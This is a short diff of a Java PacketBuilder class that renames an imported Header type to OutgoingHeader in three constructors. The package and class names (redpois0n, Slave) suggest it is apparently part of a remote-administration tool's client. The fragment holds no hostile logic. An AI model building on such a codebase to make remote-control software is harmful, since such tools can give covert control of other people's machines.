@@ -5,7 +5,7 @@ import java.util.List;
 
 import com.redpois0n.Slave;
 import com.redpois0n.common.exceptions.PacketAlreadySentException;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.packets.OutgoingHeader;
 
 public class PacketBuilder {
 
@@ -14,15 +14,15 @@ public class PacketBuilder {
 	private boolean sent;
 	private boolean plugin;
 
-	public PacketBuilder(Header header) {
+	public PacketBuilder(OutgoingHeader header) {
 		this.header = header.getHeader();
 	}
 
-	public PacketBuilder(Header header, Object extra) {
+	public PacketBuilder(OutgoingHeader header, Object extra) {
 		this(header.getHeader(), new Object[] { extra });
 	}
 
-	public PacketBuilder(Header header, Object[] extra) {
+	public PacketBuilder(OutgoingHeader header, Object[] extra) {
 		this(header.getHeader(), extra);
 	}
 
